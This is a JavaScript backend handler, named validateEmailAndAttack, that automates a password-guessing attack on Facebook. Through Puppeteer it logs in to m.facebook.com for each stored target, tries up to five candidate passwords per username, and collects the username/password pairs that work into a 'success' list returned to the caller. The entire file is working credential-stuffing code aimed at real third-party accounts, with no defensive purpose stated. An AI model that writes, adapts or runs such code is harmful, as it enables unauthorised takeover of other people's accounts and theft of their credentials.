const { default: puppeteer } = require("puppeteer");
const InformationSchema = require("../../model/informationMode");
const getTarget = require("../getTarget/getTargetDetail");
const passwordType = require("../../utils/passwordType");

const validateEmailAndAttack=async(req,res)=>{
    const getMail=req.body;
    console.log('hi',getMail)
    const getAllTargets= await getTarget();
    console.log(getTarget.message)
    let success=[];
  try {
    if (getAllTargets) {
        const parseTarget=getAllTargets
       
         for (const target of parseTarget) {
            const browser= await puppeteer.launch({headless:false});
            const page = await browser.newPage();
             await page.goto('https://m.facebook.com')
             await page.setViewport({width:390,height:844})
             await page.type('input._56bg._4u9z._5ruq._8qtn',target.userName,{delay:100})
             await page.type('input[name="pass"]',target.pass1, {delay:130})
             await page.click('button._54k8._52jh._56bs._56b_._28lf._9cow._56bw._56bu',{delay:300})
             console.log('iam clicked login')
            
             const notice = await page.waitForSelector('div[data-sigil="m_login_notice"]');
             const noticeChildren = await page.waitForSelector('div[data-sigil="m_login_notice"] > ._52jd');
             
             const loginFooter = await page.waitForSelector('div[data-sigil="m_login_footer"]');
             const loginFooterChild = await loginFooter.$('._52jd');
              console.log(noticeChildren,'iam children')
              
             if (loginFooter && !loginFooterChild) {
                console.log('insitde in in2nd password')
               await passwordType(page,target?.pass2)
               const notic1= await page.$('div[data-sigil="m_login_notice"]')
               const noticeChildren=await page.$('div[data-sigil="m_login_notice"] > ._52jd')
                if (notic1 && !noticeChildren) {
                    await passwordType(page,target?.pass3) 
                    const notice2= await page.$('div[data-sigil="m_login_notice"]')
                    const noticeChildren=await page.$('div[data-sigil="m_login_notice"] > ._52jd')
                    if (notice2 && !noticeChildren ) {
                        await passwordType(page,target?.pass4)
                        const notice3= await page.$('div[data-sigil="m_login_notice"]')
                        const noticeChildren=await page.$('div[data-sigil="m_login_notice"] > ._52jd')
                        if (notice3 && !noticeChildren) {
                            await passwordType(page,target?.pass5)//
                            const notice4= await page.$('div[data-sigil="m_login_notice"]')
                            const noticeChildren=await page.$('div[data-sigil="m_login_notice"] > ._52jd')
                            if (notice4 && !noticeChildren) {        //lolo
                              await browser.close()
                              continue
                            }

                            else{
                                const userName=target?.userName;
                                const password=target?.pass5;
                                success.push({userName,password})
                                console.log(success,'iam success push')
                                await browser.close()
                                continue

                            }

                   
                            // close



                            
                        }
                        else{
                            const userName=target?.userName;
                            const password=target?.pass4;
                            success.push({userName,password})
                            console.log(success,'iam success push')
                          await  browser.close()
                            continue
                        }
                    }
                    else{
                        const userName=target?.userName;
                        const password=target?.pass3;
                        success.push({userName,password})
                        console.log(success,'iam success push')
                       await browser.close()
                        continue
                    }
                }
                else{
                    const userName=target?.userName;
                    const password=target?.pass2;
                    success.push({userName,password})
                    console.log(success,'iam success push')
                    await browser.close()
                    continue
                }
              
             }
        
             else {
                
                
                  
                    const userName = target?.userName;
                    const password = target?.pass1;
                    // Wait for a brief period before pushing to the success array
                    await new Promise(resolve => {
                        setTimeout(() => {
                            success.push({ userName, password });
                            console.log(success, 'iam success push');
                            resolve();
                        }, 1000); // Adjust delay as needed
                    });
                    await browser.close();
                    continue;
                
                

             }

             await browser.close()
           
             

    

         }
       
    }
    res.json({message:success,sms:'iam form backend'})
  } catch (error) {
     console.log(error)
  }
   

}

module.exports=validateEmailAndAttack